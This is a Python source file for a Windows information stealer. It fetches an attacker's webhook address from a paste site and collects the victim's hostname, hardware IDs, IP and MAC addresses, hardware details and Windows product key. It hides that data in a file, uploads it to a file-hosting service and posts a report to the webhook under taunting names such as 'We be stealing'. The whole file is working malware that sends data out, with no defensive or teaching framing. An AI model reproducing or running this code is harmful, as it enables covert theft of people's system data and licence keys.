import os
if os.name == "nt":
    pass
else:
    exit()
from json import loads, dumps
from re import findall
from urllib.request import Request, urlopen
from winregistry import WinRegistry as Reg
from subprocess import Popen, PIPE
import win32api
import win32con
import sys
import windows_tools.product_key
import psutil
import re
import requests
from os import environ, path
from win32crypt import CryptUnprotectData
import json
import logging
from base64 import b64decode
from platform import system, release, version, machine, processor
from socket import gethostname, gethostbyname
from uuid import getnode
import logging
import wmi
from win32com.client import GetObject

pastebin = 'https://hastebin.com/raw/xobaredopa'
webhookURL = requests.get(pastebin).text
store = requests.get("https://api.gofile.io/getServer").text
jsonified = json.loads(store)
storeFinal = jsonified['data']['server']
myname = str(sys.argv[0])



def king():
    def getheaders(token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    try:
        computer = wmi.WMI()
        gpuName = computer.Win32_VideoController()[0].name
    except:
        gpuName = "Unknown"
    try:
        root_winmgmts = GetObject("winmgmts:root\cimv2")
        cpus = root_winmgmts.ExecQuery("Select * from Win32_Processor")
        cpuInfo = cpus[0].Name
    except:
        cpuInfo = "Unknown"
        pass
    try:
        windowsKey = windows_tools.product_key.get_windows_product_key_from_reg()
        
    except:
        windowsKey = "N/A"

    def gethwid():
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
    reg = Reg()
    path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
    hwid2 = str(reg.read_entry(path, 'HwProfileGuid')).split("'")[5]
    try:
        info={}
        info['Platform']= system() + " " + release()
        info['Platform Version']=version()
        info['Architecture']=machine()
        info['Hostname']=gethostname()
        info['HWID 1'] = "{" + gethwid().rstrip() + "}"
        info['HWID 2'] = hwid2
        info['Private IP Address']=gethostbyname(gethostname())
        info['Mac Address']=':'.join(re.findall('..', '%012x' % getnode()))
        info['CPU']=cpuInfo
        info['RAM']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        info['GPU'] = gpuName
        info['Windows Key'] = windowsKey
        resultPC = json.dumps(info, indent=4)
        # Saving as file then uplaod
        with open("pci.txt", "a") as pciFile:
            win32api.SetFileAttributes("pci.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
            pciFile.write(resultPC)
            pciFile.close()
    except Exception as e:
        logging.exception(e)
        resultPC = "N/A"
    try:
        info2={}
        info2['Platform']= system() + " " + release()
        info2['Platform Version']=version()
        info2['Architecture']=machine()
        info2['Hostname']=gethostname()
        info2['HWID 1'] = "{" + gethwid().rstrip() + "}"
        info2['HWID 2'] = hwid2
        finalLenIP = len(str(gethostbyname(gethostname()))) - len(str(gethostbyname(gethostname()))[:5])
        info2['Private IP Address']= str(gethostbyname(gethostname()))[:5] + "*" * finalLenIP
        finalLenMac = len(str(':'.join(re.findall('..', '%012x' % getnode())))) - len(str(':'.join(re.findall('..', '%012x' % getnode())))[:5])
        info2['Mac Address']=':'.join(re.findall('..', '%012x' % getnode())) + "*" * finalLenMac
        info2['CPU']=cpuInfo
        info2['RAM']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        info2['GPU'] = gpuName
        finalLenKey = len(str(windowsKey)) - len(str(windowsKey[:5]))
        info2['Windows Key'] = windowsKey[:5] + "*" * finalLenKey
        resultPC2 = json.dumps(info2, indent=4)
        with open("pci.txt", "a") as pciFile:
            win32api.SetFileAttributes("pci.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
            pciFile.write(resultPC)
            pciFile.close()
        try:
            pcInfoRaw = requests.post('https://' + storeFinal + '.gofile.io/uploadFile', files={'file': ('pci.txt', open('pci.txt', 'rb')),}).text
            pcInfoUploaded = f"[Raw]({pcInfoRaw[87:113]})"
            os.remove("pci.txt")
        except:
            pcInfoUploaded = "Raw: N/A"
            pass
    except Exception as e:
        logging.exception(e)
        resultPC = "N/A"


    def getip():
        ip = "None"
        try:
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except:
            pass
        return ip

    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    locationOfIP = "https://whatismyipaddress.com/ip/" + ip
    getColor = [0x1abc9c, 0x11806a, 0x2ecc71, 0x1f8b4c, 0x3498db, 0x206694, 0x9b59b6, 0x71368a, 0xe91e63, 0xad1457, 0xf1c40f, 0xc27c0e, 0xe67e22, 0xa84300, 0xe74c3c, 0x992d22, 0x95a5a6, 0x607d8b, 0x979c9f, 0x546e7a, 0x7289da, 0x99aab5]
    # randomColor = random.choice(getColor)
    randomColor = '15158332'
    username = "We be stealing"
    user_id = ":smiling_imp:"
    avatar_url = "https://mir-s3-cdn-cf.behance.net/project_modules/1400/2d686878402297.5ca6085aa8e1d.jpg"
    embed = {
        "color": randomColor,
        "fields": [
            {
                "name": "**PC Info**",
                "value": f'IP: ||{ip}|| | [Location]({locationOfIP}) \nUsername: {pc_username}\nPC Name: {pc_name}\n',
                "inline": True
            },
            {
                "name": "**PC Data**",
                "value":  f"```{resultPC2}```{pcInfoUploaded}\n",
                "inline": False
            }
            ],
                "footer": {
                "text": "I AM A MENACE",
                "icon_url": "https://mir-s3-cdn-cf.behance.net/project_modules/1400/2d686878402297.5ca6085aa8e1d.jpg"
        }
        }

    embeds.append(embed)
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "CALL ME GOD",
        "avatar_url": "https://mir-s3-cdn-cf.behance.net/project_modules/1400/2d686878402297.5ca6085aa8e1d.jpg"
    }
    try:
        urlopen(Request(webhookURL, data=dumps(webhook).encode(), headers=getheaders()))
    except Exception as e:
        print(e)